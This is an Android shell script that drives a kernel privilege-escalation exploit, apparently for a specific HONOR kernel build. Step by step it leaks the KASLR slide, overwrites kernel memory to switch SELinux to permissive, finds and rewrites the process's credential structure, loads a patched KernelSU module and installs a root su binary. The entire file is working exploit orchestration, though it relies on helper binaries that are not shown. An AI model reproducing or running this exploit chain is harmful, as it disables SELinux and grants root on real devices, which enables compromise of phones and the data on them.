#!/system/bin/sh
# CVE-2026-64560 path for the HONOR 6.18.21 g928 kernel.
#
# Assets and sequence are taken from HonorOneClick 2.0 Beta:
#   grab.sh + kaslr_slide -> t64560_v36 (SELinux zero write)
#   perf_cred_honor       -> t64560_v36 (fsuid/fsgid layout)
#   t64560_v42            -> two-phase RB-tree cred write + module load
#   root_stage.sh         -> ksud userspace install
#
# The script is only called for the exact g928 release.  It never retries a
# missed kernel page; failures exit non-zero and leave the plant parked.
set -u

D=${HONOR_WORK:-/data/local/tmp/magic}
# HOneClick binaries use HONOR_WORK for their /data/local/tmp/honor paths.
export HONOR_WORK="$D"
A=$D/64560-61821
KERNEL=$(uname -r 2>/dev/null || echo unknown)
EXPECTED=6.18.21-android17-5-g928d1bb4f1d7-abogki542339678-4k
LOG=$D/64560-61821.log

echo "64560_61821_BEGIN kernel=$KERNEL"
[ "$KERNEL" = "$EXPECTED" ] || { echo "64560_61821_FAIL=unsupported_kernel"; exit 2; }

for f in t64560_v36 t64560_v42 perf_cred_honor kaslr_slide forker grab.sh \
         ksu-template.ko syms.txt root_stage.sh ksud; do
    [ -f "$A/$f" ] || { echo "64560_61821_FAIL=missing_asset $f"; exit 3; }
done
[ -x "$D/ko_patch" ] || { echo "64560_61821_FAIL=missing_ko_patch"; exit 3; }
[ -x "$D/addrcalc" ] || { echo "64560_61821_FAIL=missing_addrcalc"; exit 3; }
chmod 755 "$A/t64560_v36" "$A/t64560_v42" "$A/perf_cred_honor" \
    "$A/kaslr_slide" "$A/forker" "$A/ksud" "$D/ko_patch" "$D/addrcalc" 2>/dev/null || true
: > "$LOG"

# A previous manager initialization may already have made su usable.
if /system/bin/su -c 'id -u' 2>/dev/null | grep -qx '0'; then
    echo "64560_61821_KSU_ALREADY=1"
    echo "64560_61821_DONE"
    exit 0
fi

# 1. Capture the KASLR slide with the HOneClick trace helpers.
cd "$D" || exit 4
# grab.sh executes ./forker from its cwd; use the HOneClick g928 build, not the
# generic 6.12 helper.
cp -f "$A/forker" "$D/forker" 2>/dev/null || true
chmod 755 "$D/forker" 2>/dev/null || true
HONOR_WORK="$D" sh "$A/grab.sh" >> "$LOG" 2>&1 || true
grep -q 'GRAB_DONE' "$LOG" || echo "64560_61821_GRAB=incomplete"
SLIDE=$("$A/kaslr_slide" 2>>"$LOG" | sed -n 's/^KASLR_SLIDE=//p' | tail -1)
case "$SLIDE" in 0x*|[0-9]*) ;; *) echo "64560_61821_FAIL=no_slide"; exit 5 ;; esac
echo "64560_61821_SLIDE=$SLIDE"

# 2. Zero-write selinux_state-7 (HOneClick address for g928).
SELINUX_ARG=$("$D/addrcalc" add 0xffffffc08299a6e9 "$SLIDE" 2>/dev/null | tr -d ' \r\n')
case "$SELINUX_ARG" in 0x*) ;; *) echo "64560_61821_FAIL=selinux_addr"; exit 6 ;; esac
echo "64560_61821_SELINUX_ARG=$SELINUX_ARG"
"$A/t64560_v36" 0 "$SELINUX_ARG" 160 400 16 6000 12000 4500 >> "$LOG" 2>&1
grep -qi 'Permissive' /sys/fs/selinux/enforce 2>/dev/null ||
    [ "$(cat /sys/fs/selinux/enforce 2>/dev/null)" = "0" ] ||
    { echo "64560_61821_FAIL=selinux_not_permissive"; exit 7; }
echo "64560_61821_SELINUX=permissive"

# 3. Patch the HOneClick g928 KSU module for this boot.
# HOneClick syms are "address name"; MagicRoot ko_patch expects "name address".
SYMS_KP=$D/64560-61821-syms.kpatch
awk 'NF >= 2 { print $2 " " $1 }' "$A/syms.txt" > "$SYMS_KP" 2>/dev/null || true
[ -s "$SYMS_KP" ] || { echo "64560_61821_FAIL=syms_convert"; exit 8; }
"$D/ko_patch" "$A/ksu-template.ko" "$D/ksu-patched.ko" "$SYMS_KP" \
    "$SLIDE" "$KERNEL" > "$D/64560-61821-patch.log" 2>&1
_PATCH_RC=$?
cat "$D/64560-61821-patch.log" 2>/dev/null || true
[ "$_PATCH_RC" = "0" ] && [ -s "$D/ksu-patched.ko" ] ||
    { echo "64560_61821_FAIL=ko_patch rc=$_PATCH_RC"; exit 8; }
if grep -q 'MISSING=[1-9]' "$D/64560-61821-patch.log" 2>/dev/null; then
    echo "64560_61821_FAIL=ko_patch_missing_symbols"
    exit 8
fi
# t64560_v42 hardcodes this path.
cp -f "$D/ksu-patched.ko" /data/local/tmp/ksu-patched.ko 2>/dev/null || true
chmod 644 /data/local/tmp/ksu-patched.ko 2>/dev/null || true
echo "64560_61821_PATCHED=$(wc -c < "$D/ksu-patched.ko" 2>/dev/null | tr -d ' ')"

# 4. perf tracepoint cred oracle, then the two-stage writer.
: > "$D/64560-61821-cred.log"
"$A/perf_cred_honor" > "$D/64560-61821-cred.log" 2>&1 &
_CRED_PID=$!
_CRED=""
_i=0
while [ "$_i" -lt 40 ]; do
    _CRED=$(sed -n 's/.*HIT pid=[0-9]* ptr=\(0x[0-9a-fA-F]*\).*/\1/p' \
        "$D/64560-61821-cred.log" 2>/dev/null | tail -1)
    [ -n "$_CRED" ] && break
    _i=$((_i + 1))
    sleep 1
done
[ -n "$_CRED" ] || { echo "64560_61821_FAIL=no_cred"; exit 9; }
echo "64560_61821_CRED=$_CRED"

_FSUID=$("$D/addrcalc" add "$_CRED" 0x20 2>/dev/null | tr -d ' \r\n')
"$A/t64560_v36" 0 "$_FSUID" 160 400 16 6000 12000 4500 >> "$LOG" 2>&1
echo "64560_61821_FSUID=done"

rm -f /data/local/tmp/PHASE2_DONE
"$A/t64560_v42" "$_CRED" 260 320 400 16 6000 12000 4500 \
    > "$D/64560-61821-v42.log" 2>&1 &
_V42_PID=$!
_i=0
_MODULE=0
while [ "$_i" -lt 60 ]; do
    grep -q '^kernelsu ' /proc/modules 2>/dev/null && _MODULE=1 && break
    [ -f /data/local/tmp/PHASE2_DONE ] && _MODULE=1 && break
    _i=$((_i + 1))
    sleep 1
done
[ "$_MODULE" = "1" ] || {
    echo "64560_61821_FAIL=module_not_loaded"
    tail -20 "$D/64560-61821-v42.log" 2>/dev/null || true
    exit 10
}
echo "64560_61821_MODULE=loaded"

# 5. Userspace install.  A uid-0 fd in the wrong SELinux domain is not enough:
# HOneClick's step-10 mkdir failure on g928 is exactly root_stage running as
# shell.  Only run root_stage when su is both uid 0 and u:r:ksu:s0.
cp -f "$A/ksud" "$D/ksud" 2>/dev/null || true
chmod 755 "$D/ksud" 2>/dev/null || true
_SU_PROBE=$(/system/bin/su -c 'id; getenforce' 2>&1 | tr -d '\r')
case "$_SU_PROBE" in
    *uid=0\(root\)*context=u:r:ksu:s0*)
        printf '%s\n' "$_SU_PROBE" | sed 's/^/64560_61821_SU=/'
        _STAGE_LOG=$D/64560-61821-root-stage.log
        : > "$_STAGE_LOG" 2>/dev/null || true
        /system/bin/su -c "sh '$A/root_stage.sh' '$D'" > "$_STAGE_LOG" 2>&1
        _STAGE_RC=$?
        cat "$_STAGE_LOG" 2>/dev/null | tee -a "$LOG"
        echo "64560_61821_ROOT_STAGE_RC=$_STAGE_RC"
        [ "$_STAGE_RC" = "0" ] && grep -q 'ROOT_STAGE_OK' "$_STAGE_LOG" 2>/dev/null ||
            { echo "64560_61821_FAIL=root_stage rc=$_STAGE_RC"; exit 11; }
        _SU_FINAL=$(/system/bin/su -c 'id' 2>&1 | tr -d '\r' | tr '\n' ' ')
        case "$_SU_FINAL" in
            *uid=0\(root\)*context=u:r:ksu:s0*)
                echo "64560_61821_DIRECT_SU=ok id=$_SU_FINAL" ;;
            *)
                echo "64560_61821_FAIL=direct_su_invalid id=${_SU_FINAL:-missing}"
                exit 12 ;;
        esac
        ;;
    *)
        echo "64560_61821_FAIL=no_ksu_domain probe=${_SU_PROBE:-missing}"
        echo "HINT=reboot required before retrying; root_stage was not run as shell"
        exit 11
        ;;
esac

# Module load plus direct-shell SU acceptance is the success boundary.
rm -f /data/local/tmp/bl_*.bin /data/local/tmp/PHASE2_DONE 2>/dev/null || true
rm -f /data/local/tmp/ksu-patched.ko 2>/dev/null || true
echo "64560_61821_CLEANUP=ok reason=root_verified"
echo "64560_61821_KSU=loaded"
echo "64560_61821_DONE"
exit 0
